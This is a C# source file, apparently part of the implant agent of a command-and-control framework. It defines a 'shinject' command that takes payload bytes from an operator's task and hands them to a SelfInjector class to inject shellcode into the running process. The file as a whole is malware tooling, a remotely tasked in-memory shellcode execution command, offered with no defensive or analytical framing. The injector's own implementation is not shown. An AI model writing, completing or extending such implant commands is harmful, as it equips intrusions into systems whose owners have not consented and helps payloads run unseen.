using AgentClient.Application.Services;
using AgentClient.Domain.Models.Agents;

namespace AgentClient.Application.Commands
{
    public class ShellCodeInject : AgentCommand
    {
        public override string Name => "shinject";

        public override string Execute(AgentTask task)
        {
            if (task.FileBytes == null)
            {
                throw new ArgumentException("FileBytes cannot be null", nameof(task));
            }

            var injector = new SelfInjector();
            var success = injector.Inject(task.FileBytes);

            if (success)
            {
                return "Injection successful";
            }
            else
            {
                return "Injection failed";
            }
        }
    }
}
